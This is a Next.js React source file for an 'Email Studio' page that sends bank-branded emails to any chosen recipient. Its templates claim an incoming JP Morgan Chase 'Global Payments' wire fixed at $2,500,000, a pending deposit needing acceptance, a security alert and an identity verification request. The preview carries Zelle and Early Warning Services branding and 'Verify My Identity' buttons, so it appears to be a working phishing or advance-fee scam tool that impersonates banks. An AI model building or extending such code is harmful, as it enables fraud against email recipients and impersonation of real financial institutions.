"use client"

import { useState, useEffect, useCallback } from "react"
import Image from "next/image"
import DashboardShellWithAuth from "@/components/DashboardShell"
import { searchBanks } from "@/services/bankService"
import { getBankColor } from "@/lib/email-template"
import type { Bank } from "@/types/bank"
import { Input } from "@/components/ui/input"
import {
  Mail,
  Send,
  Eye,
  Search,
  CheckCircle2,
  AlertCircle,
  Loader2,
  ShieldAlert,
  BadgeCheck,
  Clock,
  DollarSign,
  ChevronRight,
  X,
} from "lucide-react"

// ─── Template definitions ─────────────────────────────────────────────────

type TemplateId = "bank-payment" | "bank-security-alert" | "bank-account-verify" | "bank-pending-deposit"

interface TemplateDef {
  id: TemplateId
  label: string
  description: string
  icon: React.ElementType
  iconColor: string
  needsAmount: boolean
}

const TEMPLATES: TemplateDef[] = [
  {
    id: "bank-payment",
    label: "Global Payments Received",
    description: "Notify recipient of an incoming JP Morgan Chase payment from Global Payments to your institution.",
    icon: DollarSign,
    iconColor: "#10b981",
    needsAmount: true,
  },
  {
    id: "bank-pending-deposit",
    label: "Pending Deposit",
    description: "Alert recipient that a deposit is pending and requires their acceptance.",
    icon: Clock,
    iconColor: "#f59e0b",
    needsAmount: true,
  },
  {
    id: "bank-security-alert",
    label: "Security Alert",
    description: "Flag unusual account activity and prompt the recipient to secure their account.",
    icon: ShieldAlert,
    iconColor: "#ef4444",
    needsAmount: false,
  },
  {
    id: "bank-account-verify",
    label: "Account Verification",
    description: "Request identity verification to activate JP Morgan Chase payment from Global Payments on the recipient's bank account.",
    icon: BadgeCheck,
    iconColor: "#3b82f6",
    needsAmount: false,
  },
]

// ─── Send form state ──────────────────────────────────────────────────────

interface SendState {
  recipientEmail: string
  recipientName: string
  message: string
  status: "idle" | "sending" | "success" | "error"
  errorMsg: string
}

const FIXED_AMOUNT = "2,500,000.00"

// ─── Page ─────────────────────────────────────────────────────────────────

function EmailStudioContent() {
  const [banks, setBanks] = useState<Bank[]>([])
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null)
  const [selectedTemplate, setSelectedTemplate] = useState<TemplateId>("bank-payment")
  const [brokenImages, setBrokenImages] = useState<Set<string>>(new Set())
  const [previewHtml, setPreviewHtml] = useState<string | null>(null)
  const [previewLoading, setPreviewLoading] = useState(false)
  const [sendState, setSendState] = useState<SendState>({
    recipientEmail: "",
    recipientName: "",
    message: "",
    status: "idle",
    errorMsg: "",
  })

  // Load banks
  useEffect(() => {
    searchBanks(searchTerm).then(setBanks).catch(() => setBanks([]))
  }, [searchTerm])

  const currentTemplate = TEMPLATES.find((t) => t.id === selectedTemplate) ?? TEMPLATES[0]

  // Fetch preview HTML from API
  const loadPreview = useCallback(async () => {
    if (!selectedBank) return
    setPreviewLoading(true)
    try {
      const res = await fetch("/api/send-bank-email/preview", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankId: selectedBank.id,
          bankName: selectedBank.name,
          bankLogo: selectedBank.logo,
          template: selectedTemplate,
          recipientName: sendState.recipientName || "Michael Dunagan",
          amount: FIXED_AMOUNT,
          message: sendState.message,
        }),
      })
      if (res.ok) {
        const { html } = await res.json()
        setPreviewHtml(html)
      }
    } catch {
      // preview unavailable — that's fine
    } finally {
      setPreviewLoading(false)
    }
  }, [selectedBank, selectedTemplate, sendState.recipientName, sendState.message])

  // Auto-preview when bank or template changes
  useEffect(() => {
    if (selectedBank) loadPreview()
  }, [selectedBank, selectedTemplate, loadPreview])

  const updateSend = (patch: Partial<SendState>) =>
    setSendState((prev) => ({ ...prev, ...patch }))

  const handleSend = async () => {
    if (!selectedBank) return
    if (!sendState.recipientEmail) {
      updateSend({ status: "error", errorMsg: "Recipient email is required." })
      return
    }
    if (!sendState.recipientName) {
      updateSend({ status: "error", errorMsg: "Recipient name is required." })
      return
    }
    updateSend({ status: "sending", errorMsg: "" })
    try {
      const res = await fetch("/api/send-bank-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          recipientEmail: sendState.recipientEmail,
          recipientName: sendState.recipientName,
          bankId: selectedBank.id,
          bankName: selectedBank.name,
          bankLogo: selectedBank.logo,
          bankColor: getBankColor(selectedBank.id),
          template: selectedTemplate,
          amount: FIXED_AMOUNT,
          message: sendState.message || undefined,
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || "Failed to send email")
      updateSend({ status: "success" })
      setTimeout(() => updateSend({ status: "idle" }), 5000)
    } catch (err) {
      updateSend({
        status: "error",
        errorMsg: err instanceof Error ? err.message : "Failed to send email",
      })
    }
  }

  const bankColor = selectedBank ? getBankColor(selectedBank.id) : "#6D1ED4"

  return (
    <div className="min-h-screen bg-[#0a0a0a] p-6">
      {/* Page header */}
      <div className="mb-6">
        <h1 className="text-2xl font-bold text-white">Email Studio</h1>
        <p className="text-sm text-zinc-400 mt-1">
          Select a bank, choose a template, and send a branded email via Resend.
        </p>
      </div>

      <div className="flex gap-6 items-start">
        {/* ── LEFT PANEL: Bank selector + Template picker + Send form ── */}
        <div className="flex flex-col gap-4 w-80 flex-shrink-0">

          {/* Bank search */}
          <div className="rounded-xl border border-zinc-800 bg-zinc-900 overflow-hidden">
            <div className="flex items-center gap-2 px-3 py-2.5 border-b border-zinc-800">
              <Search className="w-3.5 h-3.5 text-zinc-500 flex-shrink-0" />
              <input
                type="text"
                placeholder="Search banks…"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="flex-1 bg-transparent text-sm text-white placeholder:text-zinc-500 outline-none"
              />
              {searchTerm && (
                <button onClick={() => setSearchTerm("")}>
                  <X className="w-3.5 h-3.5 text-zinc-500 hover:text-white transition-colors" />
                </button>
              )}
            </div>
            <div className="max-h-64 overflow-y-auto divide-y divide-zinc-800/50">
              {banks.map((bank) => {
                const isSelected = selectedBank?.id === bank.id
                const color = getBankColor(bank.id)
                return (
                  <button
                    key={bank.id}
                    onClick={() => setSelectedBank(bank)}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 text-left transition-colors ${isSelected
                      ? "bg-[#6D1ED4]/15 border-l-2 border-[#6D1ED4]"
                      : "hover:bg-zinc-800/50 border-l-2 border-transparent"
                      }`}
                  >
                    <div className="w-8 h-8 rounded-md bg-white flex items-center justify-center overflow-hidden flex-shrink-0">
                      {bank.logo && !brokenImages.has(bank.id) ? (
                        <Image
                          src={bank.logo}
                          alt={bank.name}
                          width={32}
                          height={32}
                          className="object-contain w-full h-full p-0.5"
                          onError={() => setBrokenImages((p) => new Set(p).add(bank.id))}
                        />
                      ) : (
                        <div
                          className="w-full h-full flex items-center justify-center text-white font-bold text-xs"
                          style={{ background: color }}
                        >
                          {bank.name.charAt(0)}
                        </div>
                      )}
                    </div>
                    <span className={`flex-1 text-sm truncate ${isSelected ? "text-white font-medium" : "text-zinc-300"}`}>
                      {bank.name}
                    </span>
                    {isSelected && <ChevronRight className="w-3.5 h-3.5 text-[#6D1ED4] flex-shrink-0" />}
                  </button>
                )
              })}
            </div>
          </div>

          {/* Template picker */}
          <div className="rounded-xl border border-zinc-800 bg-zinc-900 p-3 space-y-1.5">
            <p className="text-xs font-semibold text-zinc-500 uppercase tracking-wider px-1 mb-2">Template</p>
            {TEMPLATES.map((tpl) => {
              const Icon = tpl.icon
              const isActive = selectedTemplate === tpl.id
              return (
                <button
                  key={tpl.id}
                  onClick={() => setSelectedTemplate(tpl.id)}
                  className={`w-full flex items-start gap-3 p-2.5 rounded-lg text-left transition-all ${isActive
                    ? "bg-zinc-800 ring-1 ring-[#6D1ED4]/50"
                    : "hover:bg-zinc-800/50"
                    }`}
                >
                  <div
                    className="w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 mt-0.5"
                    style={{ background: `${tpl.iconColor}20` }}
                  >
                    <Icon className="w-4 h-4" style={{ color: tpl.iconColor }} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className={`text-sm font-medium ${isActive ? "text-white" : "text-zinc-300"}`}>{tpl.label}</div>
                    <div className="text-xs text-zinc-500 mt-0.5 leading-relaxed line-clamp-2">{tpl.description}</div>
                  </div>
                </button>
              )
            })}
          </div>

          {/* Send form */}
          {selectedBank && (
            <div className="rounded-xl border border-zinc-800 bg-zinc-900 p-4 space-y-3">
              <div className="flex items-center gap-2 mb-1">
                <Mail className="w-4 h-4 text-[#6D1ED4]" />
                <span className="text-sm font-semibold text-white">Send Email</span>
              </div>

              <div>
                <label className="block text-xs font-medium text-zinc-400 mb-1.5">
                  Recipient Name <span className="text-red-400">*</span>
                </label>
                <Input
                  placeholder="Full name"
                  value={sendState.recipientName}
                  onChange={(e) => updateSend({ recipientName: e.target.value, status: "idle", errorMsg: "" })}
                  className="h-8 text-sm bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-500 focus-visible:ring-[#6D1ED4]"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-zinc-400 mb-1.5">
                  Recipient Email <span className="text-red-400">*</span>
                </label>
                <Input
                  type="email"
                  placeholder="recipient@example.com"
                  value={sendState.recipientEmail}
                  onChange={(e) => updateSend({ recipientEmail: e.target.value, status: "idle", errorMsg: "" })}
                  className="h-8 text-sm bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-500 focus-visible:ring-[#6D1ED4]"
                />
              </div>

              {currentTemplate.needsAmount && (
                <div>
                  <label className="block text-xs font-medium text-zinc-400 mb-1.5">Amount (USD)</label>
                  <div className="flex items-center gap-2 h-8 px-3 rounded-md border border-[#6D1ED4]/40 bg-[#6D1ED4]/10 select-none cursor-not-allowed">
                    <DollarSign className="w-3.5 h-3.5 text-[#6D1ED4]" />
                    <span className="text-sm font-bold text-[#6D1ED4]">2,500,000.00 USD</span>
                    <span className="ml-auto text-[10px] font-semibold text-[#6D1ED4]/60 uppercase tracking-wider">INTERNATIONAL WIRE</span>
                  </div>
                </div>
              )}

              <div>
                <label className="block text-xs font-medium text-zinc-400 mb-1.5">Note (optional)</label>
                <Input
                  placeholder="Optional message…"
                  value={sendState.message}
                  onChange={(e) => updateSend({ message: e.target.value })}
                  className="h-8 text-sm bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-500 focus-visible:ring-[#6D1ED4]"
                />
              </div>

              {sendState.status === "error" && sendState.errorMsg && (
                <div className="flex items-start gap-2 text-xs text-red-400 bg-red-950/40 border border-red-800/50 rounded-lg px-3 py-2">
                  <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                  <span className="flex-1">{sendState.errorMsg}</span>
                  <button onClick={() => updateSend({ status: "idle", errorMsg: "" })}>
                    <X className="w-3 h-3 text-red-400" />
                  </button>
                </div>
              )}
              {sendState.status === "success" && (
                <div className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-950/40 border border-emerald-800/50 rounded-lg px-3 py-2">
                  <CheckCircle2 className="w-3.5 h-3.5 flex-shrink-0" />
                  <span>Email sent successfully via JP Morgan Payments.</span>
                </div>
              )}

              <button
                onClick={handleSend}
                disabled={sendState.status === "sending"}
                className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold text-white transition-colors disabled:opacity-60 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 focus:ring-offset-zinc-900"
                style={{ background: bankColor }}
              >
                {sendState.status === "sending" ? (
                  <><Loader2 className="w-4 h-4 animate-spin" /> Sending…</>
                ) : (
                  <><Send className="w-4 h-4" /> Send via Global Payments</>
                )}
              </button>
            </div>
          )}
        </div>

        {/* ── RIGHT PANEL: Live preview ── */}
        <div className="flex-1 min-w-0 rounded-xl border border-zinc-800 bg-zinc-900 overflow-hidden">
          {/* Preview header */}
          <div className="flex items-center justify-between px-5 py-3 border-b border-zinc-800">
            <div className="flex items-center gap-2.5">
              <Eye className="w-4 h-4 text-zinc-400" />
              <span className="text-sm font-medium text-zinc-300">Live Preview</span>
              {selectedBank && (
                <>
                  <span className="text-zinc-600">/</span>
                  <span className="text-sm text-zinc-400">{selectedBank.name}</span>
                  <span className="text-zinc-600">/</span>
                  <span className="text-sm text-zinc-400">{currentTemplate.label}</span>
                </>
              )}
            </div>
            {selectedBank && (
              <button
                onClick={loadPreview}
                className="text-xs text-zinc-400 hover:text-white transition-colors flex items-center gap-1"
              >
                <Loader2 className={`w-3 h-3 ${previewLoading ? "animate-spin" : ""}`} />
                Refresh
              </button>
            )}
          </div>

          {/* Preview body */}
          <div className="p-4 bg-zinc-950 min-h-[600px] flex flex-col items-center">
            {!selectedBank ? (
              <div className="flex flex-col items-center justify-center h-96 text-center">
                <div className="w-16 h-16 rounded-full bg-zinc-800 flex items-center justify-center mb-4">
                  <Mail className="w-7 h-7 text-zinc-600" />
                </div>
                <p className="text-zinc-400 font-medium">Select a bank to preview the template</p>
                <p className="text-zinc-600 text-sm mt-1">The branded email will appear here</p>
              </div>
            ) : previewLoading ? (
              <div className="flex flex-col items-center justify-center h-96 gap-3">
                <div className="w-8 h-8 border-2 border-[#6D1ED4] border-t-transparent rounded-full animate-spin" />
                <p className="text-zinc-500 text-sm">Generating preview…</p>
              </div>
            ) : previewHtml ? (
              <iframe
                srcDoc={previewHtml}
                title="Email preview"
                className="w-full rounded-lg border border-zinc-800"
                style={{ height: "700px", background: "#fff" }}
                sandbox="allow-same-origin"
              />
            ) : (
              /* Fallback static preview when API preview endpoint isn't available */
              <div className="w-full max-w-xl mx-auto rounded-lg overflow-hidden border border-zinc-800">
                {/* Bank header */}
                <div
                  className="px-8 py-5 flex items-center justify-between"
                  style={{ background: getBankColor(selectedBank.id) }}
                >
                  <div className="w-32 h-10 bg-white/20 rounded flex items-center justify-center">
                    {selectedBank.logo && !brokenImages.has(selectedBank.id) ? (
                      <Image
                        src={selectedBank.logo}
                        alt={selectedBank.name}
                        width={100}
                        height={36}
                        className="object-contain"
                        onError={() => setBrokenImages((p) => new Set(p).add(selectedBank.id))}
                      />
                    ) : (
                      <span className="text-white font-bold text-sm">{selectedBank.name}</span>
                    )}
                  </div>
                  <span className="text-white/60 text-xs">Powered by Zelle®</span>
                </div>
                {/* Color stripe */}
                <div
                  className="h-1"
                  style={{ background: `linear-gradient(90deg, ${getBankColor(selectedBank.id)}, #6D1ED4)` }}
                />
                {/* Content */}
                <div className="bg-white p-8">
                  <h2 className="text-xl font-bold text-gray-900 mb-2">{currentTemplate.label}</h2>
                  <p className="text-gray-500 text-sm mb-6">{currentTemplate.description}</p>
                  {currentTemplate.needsAmount && (
                    <div
                      className="rounded-lg p-5 mb-6 text-center"
                      style={{ background: getBankColor(selectedBank.id) }}
                    >
                      <div className="text-white/80 text-xs uppercase tracking-widest mb-1">Amount</div>
                      <div className="text-white text-3xl font-bold">$25.00</div>
                      <div className="text-white/60 text-xs mt-1">USD via {selectedBank.name}</div>
                    </div>
                  )}
                  <div className="space-y-2 text-sm text-gray-600 border border-gray-100 rounded-lg overflow-hidden">
                    <div className="flex gap-0">
                      <span className="w-32 px-4 py-2.5 bg-gray-50 text-gray-500 text-xs">Recipient</span>
                      <span className="px-4 py-2.5 text-gray-700">{sendState.recipientName || "Preview Name"}</span>
                    </div>
                    <div className="flex border-t border-gray-100">
                      <span className="w-32 px-4 py-2.5 bg-gray-50 text-gray-500 text-xs">Bank</span>
                      <span className="px-4 py-2.5 text-gray-700">{selectedBank.name}</span>
                    </div>
                    <div className="flex border-t border-gray-100">
                      <span className="w-32 px-4 py-2.5 bg-gray-50 text-gray-500 text-xs">Template</span>
                      <span className="px-4 py-2.5 text-gray-700">{currentTemplate.label}</span>
                    </div>
                  </div>
                  <div className="mt-6 text-center">
                    <div
                      className="inline-block px-8 py-3 rounded-md text-white font-semibold text-sm"
                      style={{ background: getBankColor(selectedBank.id) }}
                    >
                      {currentTemplate.id === "bank-security-alert" ? "Secure My Account" :
                        currentTemplate.id === "bank-account-verify" ? "Verify My Identity" : "Accept Payment"}
                    </div>
                  </div>
                </div>
                {/* Footer */}
                <div className="bg-gray-50 px-8 py-5 border-t border-gray-100">
                  <p className="text-xs text-gray-400 text-center leading-relaxed">
                    Sent on behalf of <strong>{selectedBank.name}</strong> via the Zelle® network.<br />
                    © 2026 Early Warning Services, LLC. All rights reserved.
                  </p>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default function EmailStudioPage() {
  return (
    <DashboardShellWithAuth>
      <EmailStudioContent />
    </DashboardShellWithAuth>
  )
}
